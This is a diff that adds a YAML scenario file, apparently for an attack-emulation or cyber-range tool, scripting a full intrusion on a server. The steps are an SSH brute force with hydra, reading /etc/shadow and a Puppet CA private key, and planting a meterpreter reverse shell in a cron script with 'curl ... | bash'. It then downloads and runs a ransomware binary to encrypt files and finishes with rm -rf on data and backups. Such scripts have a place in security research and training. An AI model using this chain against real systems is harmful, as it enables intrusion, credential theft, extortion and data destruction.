@@ -1,0 +1,175 @@
+####################
+#
+# Scenario 3 a a
+#
+####################
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $DNS_SERVER: 192.42.0.233
+
+commands:
+  - type: shell
+    cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
+
+  - type: ssh
+    creates_session: foothold
+    username: john
+    password: rambo
+    hostname: $SERVER_ADDRESS
+    port: 10022
+    cmd: id
+
+  - type: ssh
+    session: foothold
+    cmd: "tcpdump -A port 21\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 20
+
+  - type: ssh
+    session: foothold
+    cmd: "03"
+    interactive: True
+    bin: True
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo -i\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "rambo\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "id\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cat /etc/shadow\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cat /media/share/healthcheck_cron.sh\n"
+    interactive: True
+
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  - type: msf-payload
+    cmd: cmd/unix/python/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    local_path: $RSHELL
+
+  - type: msf-module
+    creates_session: movement
+    cmd: exploit/multi/handler
+    payload: "cmd/unix/python/meterpreter/reverse_tcp"
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    background: true
+    kill_on_exit: true
+
+  - type: webserv
+    local_path: $RSHELL
+    port: 8888
+    background: True
+    kill_on_exit: true
+
+  - type: ssh
+    session: foothold
+    cmd: "vim /media/share/healthcheck_cron.sh\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "G"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "o"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "1B"
+    interactive: True
+    bin: True
+
+  - type: ssh
+    session: foothold
+    cmd: ":wq\n"
+    interactive: True
+################### MOVED ############################################
+  - type: msf-session
+    session: movement
+    cmd: sysinfo
+
+  - type: msf-session
+    session: movement
+    cmd: getuid
+
+  - type: msf-session
+    session: movement
+    cmd: shell
+
+  # Prepare for upgradeshell
+  - type: setvar
+    cmd: movement
+    variable: $UPGRADESESSION
+
+  - type: include
+    local_path: upgrade.yml
+
+  - type: msf-session
+    session: movement
+    cmd: curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry
+
+  - type: msf-session
+    session: movement
+    cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
+
+  - type: msf-session
+    session: movement
+    cmd: find /media/data/Images
+
+  - type: msf-session
+    session: movement
+    cmd: cat /etc/passwd
+  
+  - type: msf-session
+    session: movement
+    cmd: userdel -f john
+  
+  - type: msf-session
+    session: movement
+    cmd: rm -rf /media/data/*
+  
+  - type: msf-session
+    session: movement
+    cmd: rm -rf /var/backups/*
+  
+  - type: msf-session
+    session: movement
+    cmd: systemctl stop exim4.service
